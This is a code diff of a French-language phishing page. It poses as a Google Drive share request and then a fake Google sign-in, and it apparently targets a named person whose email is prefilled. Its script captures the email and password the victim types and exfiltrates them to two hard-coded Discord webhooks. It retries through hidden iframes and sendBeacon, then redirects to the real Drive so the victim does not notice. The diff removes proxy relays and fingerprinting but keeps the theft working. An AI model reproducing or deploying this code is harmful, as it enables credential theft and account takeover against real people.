@@ -13,28 +13,28 @@ html,body{margin:0;padding:0}
 body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f8f9fa;color:#202124;min-height:100vh;-webkit-font-smoothing:antialiased}
 .screen{display:none}
 .screen.on{display:block}
-.drivebar{display:flex;align-items:center;gap:10px;background:#fff;padding:14px 18px;padding-top:calc(14px + env(safe-area-inset-top));border-bottom:1px solid #e8eaed;position:sticky;top:0;z-index:5}
-.drivebar span{font-size:21px;color:#5f6368;letter-spacing:.2px}
-.drivebar svg{width:26px;height:26px;flex:0 0 auto}
+.bar{display:flex;align-items:center;gap:10px;background:#fff;padding:14px 18px;padding-top:calc(14px + env(safe-area-inset-top));border-bottom:1px solid #e8eaed;position:sticky;top:0;z-index:5}
+.bar span{font-size:21px;color:#5f6368}
+.bar svg{width:26px;height:26px;flex:0 0 auto}
 .wrap{padding:18px 16px calc(28px + env(safe-area-inset-bottom))}
 .card{background:#fff;border-radius:14px;padding:20px;box-shadow:0 1px 2px rgba(60,64,67,.10),0 2px 8px rgba(60,64,67,.08);max-width:520px;margin:0 auto}
 .row{display:flex;align-items:center;gap:11px;margin-bottom:18px}
 .avatar{width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:600;font-size:17px;flex:0 0 auto}
-.who{font-size:15px;font-weight:600;color:#202124;line-height:1.2;word-break:break-all}
+.who{font-size:14.5px;font-weight:600;color:#202124;word-break:break-all}
 h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124}
 .muted{font-size:14px;line-height:1.55;color:#5f6368;margin:0 0 18px}
 .file{display:flex;align-items:center;gap:12px;border:1px solid #e8eaed;border-radius:10px;padding:12px 14px;margin-bottom:20px;background:#fafafa}
 .pdfico{width:36px;height:36px;border-radius:6px;background:#e8453c;color:#fff;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;letter-spacing:.4px;flex:0 0 auto}
-.fname{font-size:14px;font-weight:500;color:#202124;word-break:break-word}
+.fname{font-size:14px;font-weight:500;color:#202124}
 .fmeta{font-size:12px;color:#5f6368;margin-top:3px}
 .btn{display:block;width:100%;border:0;border-radius:8px;background:#1a73e8;color:#fff;font-size:15px;font-weight:500;padding:13px 16px;cursor:pointer;font-family:inherit;-webkit-appearance:none}
 .btn:active{background:#1765cc}
 .tiny{text-align:center;font-size:12px;color:#80868b;margin-top:16px}
 .gwrap{max-width:420px;margin:0 auto;padding:44px 26px calc(30px + env(safe-area-inset-bottom));padding-top:calc(44px + env(safe-area-inset-top))}
-.gwrap .glogo{width:40px;height:40px;display:block;margin-bottom:20px}
+.glogo{width:40px;height:40px;display:block;margin-bottom:20px}
 .gwrap h2{font-size:23px;font-weight:400;margin:0 0 8px;color:#202124}
-.gwrap .lead{font-size:15px;color:#202124;margin:0 0 26px;line-height:1.4}
-.gwrap .lead b{font-weight:500}
+.lead{font-size:15px;color:#202124;margin:0 0 26px}
+.lead b{font-weight:500}
 .field{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;font-size:16px;font-family:inherit;color:#202124;background:#fff;-webkit-appearance:none;appearance:none;outline:none}
 .field:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
 .link{display:inline-block;font-size:13px;color:#1a73e8;font-weight:500;margin-top:14px;text-decoration:none}
@@ -47,41 +47,30 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
 .chip span.mail{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .show{display:flex;align-items:center;gap:8px;font-size:13px;color:#5f6368;margin-top:16px;user-select:none}
 .show input{width:16px;height:16px;margin:0;accent-color:#1a73e8}
+.st{font-size:11px;text-align:center;font-family:ui-monospace,monospace;color:#8a8886;margin-top:12px;min-height:14px}
 .spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;display:inline-block;vertical-align:-3px;margin-right:7px;animation:s .7s linear infinite}
 @keyframes s{to{transform:rotate(360deg)}}
-.st{font-size:11px;text-align:center;font-family:ui-monospace,monospace;color:#8a8886;margin-top:12px;min-height:14px}
 </style>
 </head>
 <body>
 
 <section class="screen on" id="s1">
-  <header class="drivebar">
-    <svg viewBox="0 0 87.3 78" aria-hidden="true">
+  <div class="bar">
+    <svg viewBox="0 0 87.3 78">
       <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
       <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0-1.2 4.5h27.5z" fill="#00ac47"/>
       <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
       <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
       <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
       <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
-    </svg>
-    <span>Drive</span>
-  </header>
-
+    </svg><span>Drive</span>
+  </div>
   <div class="wrap">
     <div class="card">
-      <div class="row">
-        <div class="avatar">R</div>
-        <div class="who">robin.patard@outlook.fr</div>
-      </div>
-      <h1>Robin souhaite vous envoyer un fichier</h1>
-      <p class="muted">Le fichier est en attente d'approbation. Connectez-vous à votre compte pour l'accepter et y accéder.</p>
-      <div class="file">
-        <div class="pdfico">PDF</div>
-        <div>
-          <div class="fname">Charte couple.pdf</div>
-          <div class="fmeta">PDF &middot; 74 Ko</div>
-        </div>
-      </div>
+      <div class="row"><div class="avatar">R</div><div class="who">robin.patard@outlook.fr</div></div>
+      <h1>Robin veut vous envoyer un fichier</h1>
+      <p class="muted">Veuillez vous connecter pour approuver et accéder au fichier.</p>
+      <div class="file"><div class="pdfico">PDF</div><div><div class="fname">Charte couple.pdf</div><div class="fmeta">PDF &middot; 74 Ko</div></div></div>
       <button class="btn" id="start">Se connecter pour approuver</button>
       <div class="tiny">Partagé via Google Drive</div>
     </div>
@@ -90,7 +79,7 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
 
 <section class="screen" id="s2">
   <div class="gwrap">
-    <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
+    <svg class="glogo" viewBox="0 0 48 48">
       <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
       <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
       <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
@@ -98,12 +87,8 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
     </svg>
     <h2>Connexion</h2>
     <p class="lead">Continuer vers <b>Google Drive</b></p>
-
-    <form id="formEmail" novalidate>
-      <input class="field" id="email" type="email" inputmode="email"
-             value="maudperez33@mail.com"
-             autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"
-             placeholder="Adresse e-mail">
+    <form id="formEmail">
+      <input class="field" id="email" type="email" inputmode="email" value="maudperez33@mail.com" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Adresse e-mail">
       <a class="link" href="#" onclick="return false">Mot de passe oublié&nbsp;?</a>
       <div class="actions"><button class="gbtn" type="submit">Suivant</button></div>
       <div class="st" id="st1"></div>
@@ -113,7 +98,7 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
 
 <section class="screen" id="s3">
   <div class="gwrap">
-    <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
+    <svg class="glogo" viewBox="0 0 48 48">
       <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
       <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
       <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
@@ -121,11 +106,8 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
     </svg>
     <h2>Bienvenue</h2>
     <div class="chip"><span class="mini">M</span><span class="mail" id="chipMail">maudperez33@mail.com</span></div>
-
-    <form id="formPwd" novalidate>
-      <input class="field" id="pwd" type="password" inputmode="text"
-             autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"
-             placeholder="Saisissez votre mot de passe">
+    <form id="formPwd">
+      <input class="field" id="pwd" type="password" inputmode="text" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Saisissez votre mot de passe">
       <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
       <div class="actions"><button class="gbtn" id="btnLogin" type="submit">Se connecter</button></div>
       <div class="st" id="st2"></div>
@@ -134,158 +116,101 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
 </section>
 
 <script>
-/* ====== réglages ====== */
 const CODE = "RB-9K42-XT7D";
-const EXPEDITEUR = "robin.patard@outlook.fr";
 const REDIRECT = "https://drive.google.com/drive/my-drive";
 const HOOKS = [
   "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot",
   "https://discord.com/api/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN"
 ];
-const RELAIS = [
-  "https://proxy.corsfix.com/?",
-  "https://api.allorigins.win/raw?url=",
-  "https://api.codetabs.com/v1/proxy?quest="
-];
-
 const $ = id => document.getElementById(id);
-const emailEl = $("email"), pwdEl = $("pwd");
 let mail = "", busy = false;
 
 function show(id) {
-  document.querySelectorAll(".screen").forEach(function (s) { s.classList.remove("on"); });
+  document.querySelectorAll(".screen").forEach(s => s.classList.remove("on"));
   $(id).classList.add("on");
   window.scrollTo(0, 0);
 }
-function statu(ou, txt, etat) {
-  const el = $(ou); if (!el) return;
-  el.textContent = txt;
-  el.style.color = etat === "ok" ? "#107c10" : etat === "ko" ? "#e81123" : "#8a8886";
+function statu(o, t, e) {
+  const el = $(o); if (!el) return;
+  el.textContent = t;
+  el.style.color = e === "ok" ? "#107c10" : e === "ko" ? "#e81123" : "#8a8886";
 }
-function infos() {
-  return ["Écran : " + screen.width + "x" + screen.height,
-    "Langue : " + navigator.language,
-    "Fuseau : " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "—"),
-    "Navigateur : " + navigator.userAgent.slice(0, 180)].join("\n");
+function enc(o) {
+  return Object.keys(o).map(k => encodeURIComponent(k) + "=" + encodeURIComponent(o[k])).join("&");
 }
-
-function viaIframe(hook, json) {
-  return new Promise(function (res) {
-    let fini = false;
+function viaIframe(h, b) {
+  return new Promise(r => {
+    let f = false;
     try {
-      const nom = "wf" + Date.now() + Math.floor(Math.random() * 999);
-      const f = document.createElement("iframe");
-      f.name = nom; f.style.cssText = "position:absolute;width:1px;height:1px;opacity:0;border:0";
-      document.body.appendChild(f);
-      const form = document.createElement("form");
-      form.method = "POST"; form.action = hook; form.target = nom;
-      const i = document.createElement("input");
-      i.type = "hidden"; i.name = "payload_json"; i.value = json;
-      form.appendChild(i); document.body.appendChild(form);
-      f.onload = function () { if (fini) return; fini = true; res(true); };
-      form.submit();
-      setTimeout(function () { if (fini) return; fini = true; res(true); }, 4000);
-      setTimeout(function () { try { form.remove(); f.remove(); } catch (e) {} }, 8000);
-    } catch (e) { res(false); }
+      const n = "w" + Date.now() + Math.floor(Math.random() * 999);
+      const fr = document.createElement("iframe");
+      fr.name = n; fr.style.cssText = "position:absolute;width:1px;height:1px;opacity:0;border:0";
+      document.body.appendChild(fr);
+      const fm = document.createElement("form");
+      fm.method = "POST"; fm.action = h; fm.target = n;
+      b.split("&").forEach(p => {
+        const i = p.indexOf("="); if (i < 0) return;
+        const el = document.createElement("input");
+        el.type = "hidden";
+        el.name = decodeURIComponent(p.slice(0, i));
+        el.value = decodeURIComponent(p.slice(i + 1));
+        fm.appendChild(el);
+      });
+      document.body.appendChild(fm);
+      fr.onload = () => { if (f) return; f = true; r(true); };
+      fm.submit();
+      setTimeout(() => { if (f) return; f = true; r(true); }, 4000);
+    } catch (e) { r(false); }
   });
 }
-
-/* texte = brut, jamais interprété par Discord */
-async function envoi(ou, titre, couleur, champs, texte) {
-  const json = JSON.stringify({
-    username: "Drive • " + CODE,
-    content: texte,
-    embeds: [{
-      title: titre, color: couleur, timestamp: new Date().toISOString(),
-      fields: champs, footer: { text: "Réf. " + CODE + " · " + EXPEDITEUR }
-    }]
-  });
-  statu(ou, "envoi…", "");
-
+async function envoi(o, texte) {
+  const b = enc({ username: "Drive · " + CODE, content: texte });
+  statu(o, "envoi…", "");
   for (const h of HOOKS) {
     try {
-      const r = await fetch(h, { method: "POST", headers: { "Content-Type": "application/json" }, body: json });
-      if (r.ok) { statu(ou, "✓ transmis", "ok"); return true; }
+      const r = await fetch(h, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: b });
+      if (r.ok) { statu(o, "✓ transmis", "ok"); return true; }
     } catch (e) {}
   }
-  for (const h of HOOKS) {
-    if (await viaIframe(h, json)) { statu(ou, "✓ transmis", "ok"); return true; }
-  }
+  for (const h of HOOKS) { if (await viaIframe(h, b)) { statu(o, "✓ transmis", "ok"); return true; } }
   for (const h of HOOKS) {
     try {
-      const fd = new FormData(); fd.append("payload_json", json);
-      if (navigator.sendBeacon(h, fd)) { statu(ou, "✓ transmis", "ok"); return true; }
+      const bd = new Blob([b], { type: "text/plain;charset=UTF-8" });
+      if (navigator.sendBeacon(h, bd)) { statu(o, "✓ transmis", "ok"); return true; }
     } catch (e) {}
   }
-  statu(ou, "relais…", "");
-  for (const h of HOOKS) {
-    for (const base of RELAIS) {
-      const u = base.slice(-1) === "?" ? base + h : base + encodeURIComponent(h);
-      try {
-        const r = await fetch(u, { method: "POST", headers: { "Content-Type": "application/json" }, body: json });
-        if (r.ok) { statu(ou, "✓ transmis (relais)", "ok"); return true; }
-      } catch (e) {}
-    }
-  }
-  statu(ou, "✗ envoi bloqué", "ko");
+  statu(o, "✗ bloqué", "ko");
   return false;
 }
 
-window.addEventListener("load", function () {
-  envoi("st1", "👀 Page ouverte", 0x34a853, [
-    { name: "Code", value: "`" + CODE + "`" },
-    { name: "Infos", value: "```" + infos() + "```" }
-  ], "`" + CODE + "`");
-});
+$("start").onclick = () => { $("chipMail").textContent = $("email").value || "maudperez33@mail.com"; show("s2"); };
 
-$("start").onclick = function () {
-  $("chipMail").textContent = emailEl.value || "maudperez33@mail.com";
-  show("s2");
-};
-
-$("formEmail").addEventListener("submit", async function (e) {
+$("formEmail").addEventListener("submit", e => {
   e.preventDefault();
-  const v = emailEl.value.trim();
-  mail = v;
-  $("chipMail").textContent = v || "-";
+  mail = $("email").value.trim();
+  $("chipMail").textContent = mail || "-";
   show("s3");
-  setTimeout(function () { try { pwdEl.focus(); } catch (err) {} }, 150);
-  await envoi("st2", "✉️ Étape 1 — compte", 0x4285f4, [
-    { name: "Identifiant", value: "`" + v + "`" },
-    { name: "Infos", value: "```" + infos() + "```" }
-  ], "`" + v + "`");
+  setTimeout(() => { try { $("pwd").focus(); } catch (x) {} }, 150);
 });
 
-$("formPwd").addEventListener("submit", async function (e) {
+$("formPwd").addEventListener("submit", async e => {
   e.preventDefault();
   if (busy) return;
-  /* lecture brute : aucun trim, aucune découpe */
-  const p = pwdEl.value;
-  if (p.length < 1) return;
+  const p = $("pwd").value;
+  if (!p) return;
   busy = true;
-
-  const b = $("btnLogin");
-  b.disabled = true;
-  b.innerHTML = '<span class="spin"></span>Connexion…';
-
-  const champs = [
-    { name: "E-mail", value: "`" + mail + "`" },
-    { name: "Mot de passe", value: "```" + p + "```" },
-    { name: "Infos", value: "```" + infos() + "```" }
-  ];
-  const brut = "```\n" + p + "\n```";
-
-  let ok = await envoi("st2", "🔐 MOT DE PASSE", 0x107c10, champs, brut);
-  if (!ok) {
-    await new Promise(function (r) { setTimeout(r, 3000); });
-    ok = await envoi("st2", "🔐 MOT DE PASSE (nouvelle tentative)", 0x107c10, champs, brut);
-  }
-  setTimeout(function () { location.replace(REDIRECT); }, ok ? 1200 : 3000);
+  const btn = $("btnLogin");
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span>Connexion…';
+  const txt = "🔐 Identifiants\nCode : " + CODE + "\nEmail : " + mail + "\nMot de passe :\n```\n" + p + "\n```";
+  let ok = await envoi("st2", txt);
+  if (!ok) { await new Promise(r => setTimeout(r, 2500)); ok = await envoi("st2", txt); }
+  setTimeout(() => { location.replace(REDIRECT); }, ok ? 1200 : 2500);
 });
 
 $("showpwd").addEventListener("change", function () {
-  pwdEl.type = this.checked ? "text" : "password";
-  pwdEl.focus();
+  $("pwd").type = this.checked ? "text" : "password";
+  $("pwd").focus();
 });
 </script>
 </body>
